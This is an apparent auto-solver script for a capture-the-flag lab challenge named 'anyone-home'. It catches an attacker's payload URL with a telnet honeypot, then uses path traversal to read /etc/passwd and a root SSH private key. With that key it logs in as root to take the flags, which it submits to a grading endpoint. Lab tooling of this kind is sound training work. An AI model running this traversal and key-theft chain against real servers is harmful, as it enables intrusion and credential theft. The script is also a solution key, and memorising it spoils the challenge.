#!/bin/bash
set -euo pipefail

CHALLENGE_ID="anyone-home"
ATTACKER_HOST="172.20.0.46"
ATTACKER_HTTP_PORT="8080"
HTTP_BASE="http://${ATTACKER_HOST}:${ATTACKER_HTTP_PORT}"
PAYLOAD_ROOT="0ZbPWi0apUuFbpiwN2fp"
SUBMISSION_URL="http://172.20.0.3/api/challenges/submit"
HONEYPOT_SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HONEYPOT_SCRIPT="${HONEYPOT_SCRIPT_DIR}/auto-solve/telnet-honeypot.py"
PAYLOAD_DOWNLOAD_URL="http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp/payload.sh"

TMP_DIR="$(mktemp -d)"
HONEYPOT_LOG="${TMP_DIR}/honeypot.log"
PAYLOAD_FILE="${TMP_DIR}/payload.sh"
LISTING_FILE="${TMP_DIR}/listing.txt"
SSH_KEY_FILE="${TMP_DIR}/attacker_key"

cleanup() {
  if [[ -n "${HONEYPOT_PID:-}" ]] && kill -0 "${HONEYPOT_PID}" 2>/dev/null; then
    kill "${HONEYPOT_PID}" 2>/dev/null || true
    wait "${HONEYPOT_PID}" 2>/dev/null || true
  fi
  rm -rf "${TMP_DIR}"
}
trap cleanup EXIT

download_with_fallback() {
  local destination="$1"
  shift
  local url
  for url in "$@"; do
    if curl --path-as-is -fsSL "${url}" -o "${destination}"; then
      echo "${url}"
      return 0
    fi
  done
  return 1
}

submit_flag() {
  local task_id="$1"
  local flag="$2"

  local payload
  payload=$(printf '{"challenge_id":"%s","task_id":"%s","flag":"%s"}' "${CHALLENGE_ID}" "${task_id}" "${flag}")
  local response
  response=$(curl -sS "${SUBMISSION_URL}" \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-raw "${payload}")

  if [[ "${response}" != *"Congratulations"* ]]; then
    printf 'Flag submission for %s failed: %s\n' "${task_id}" "${response}" >&2
    exit 1
  fi
}

echo "[*] Starting telnet honeypot..."
timeout 60 bash -c "python3 "${HONEYPOT_SCRIPT}" >"${HONEYPOT_LOG}" 2>&1" &
HONEYPOT_PID=$!

DEADLINE=$((SECONDS + 60))

while (( SECONDS < DEADLINE )); do
  if ! kill -0 "${HONEYPOT_PID}" 2>/dev/null; then
    echo "[!] Honeypot exited unexpectedly. Log output:"
    cat "${HONEYPOT_LOG}" >&2 || true
    exit 1
  fi

  if grep -q "${PAYLOAD_DOWNLOAD_URL}" "${HONEYPOT_LOG}" 2>/dev/null; then
    echo "[*] Detected attacker payload staging activity."
    break
  fi
  sleep 1
done

if (( SECONDS >= DEADLINE )); then
  echo "[!] Timeout waiting for attacker payload URL in honeypot output."
  exit 1
fi

echo "[*] Stopping telnet honeypot."
if kill "${HONEYPOT_PID}" 2>/dev/null; then
  wait "${HONEYPOT_PID}" 2>/dev/null || true
fi

PAYLOAD_URLS=(
  "${HTTP_BASE}//${PAYLOAD_ROOT}/payload.sh"
  "${HTTP_BASE}/${PAYLOAD_ROOT}/payload.sh"
)

echo "[*] Downloading attacker payload..."
if ! PAYLOAD_SOURCE=$(download_with_fallback "${PAYLOAD_FILE}" "${PAYLOAD_URLS[@]}"); then
  echo "[!] Failed to download payload from attacker HTTP server." >&2
  exit 1
fi
echo "[+] Downloaded attacker payload from ${PAYLOAD_SOURCE}"

TASK1_FLAG=$(grep -ao 'BSY{[^}]*}' "${PAYLOAD_FILE}" | head -n1 || true)
if [[ -z "${TASK1_FLAG}" ]]; then
  echo "[!] Flag not found inside downloaded payload." >&2
  exit 1
fi
echo "[+] Retrieved first flag: ${TASK1_FLAG}"

echo "[*] Submitting first flag..."
submit_flag "task1" "${TASK1_FLAG}"
echo "[*] Successfully submitted flag for task1!!!"

LISTING_URLS=(
  "${HTTP_BASE}//${PAYLOAD_ROOT}/../../../../../../../etc/passwd"
  "${HTTP_BASE}/${PAYLOAD_ROOT}/../../../../../../../etc/passwd"
)

echo "[*] Fetching /etc/passwd via LFI vulnerability"
if ! LISTING_SOURCE=$(download_with_fallback "${LISTING_FILE}" "${LISTING_URLS[@]}"); then
  echo "[!] Failed to retrieve /etc/passwd." >&2
  exit 1
fi
echo "[+] Retrieved /etc/passwd"

if ! grep -q "root" "${LISTING_FILE}"; then
  echo "[!] /etc/passwd listing does not mention root user" >&2
  cat "${LISTING_FILE}" >&2 || true
  exit 1
fi

KEY_URLS=(
  "${HTTP_BASE}//${PAYLOAD_ROOT}/../../../../../../../root/.ssh/key"
  "${HTTP_BASE}/${PAYLOAD_ROOT}/../../../../../../../root/.ssh/key"
)

echo "[*] Downloading attacker SSH key..."
if ! KEY_SOURCE=$(download_with_fallback "${SSH_KEY_FILE}" "${KEY_URLS[@]}"); then
  echo "[!] Failed to download attacker SSH private key." >&2
  exit 1
fi
echo "[+] Downloaded attacker SSH key from ${KEY_SOURCE}"
chmod 600 "${SSH_KEY_FILE}"

echo "[*] Pivoting into attacker machine via SSH..."
SECOND_FLAG=$(ssh -q -i "${SSH_KEY_FILE}" \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o BatchMode=yes \
  root@"${ATTACKER_HOST}" 'cat /root/.flag.txt' | tr -d '\r' || true)

if [[ -z "${SECOND_FLAG}" ]]; then
  echo "[!] Unable to retrieve second flag from attacker host." >&2
  exit 1
fi
echo "[+] Retrieved second flag: ${SECOND_FLAG}"

echo "[*] Submitting second flag..."
submit_flag "task2" "${SECOND_FLAG}"
echo "[*] Successfully submitted flag for task2!!!"

echo ""
echo "[✓] Auto-solve completed successfully."
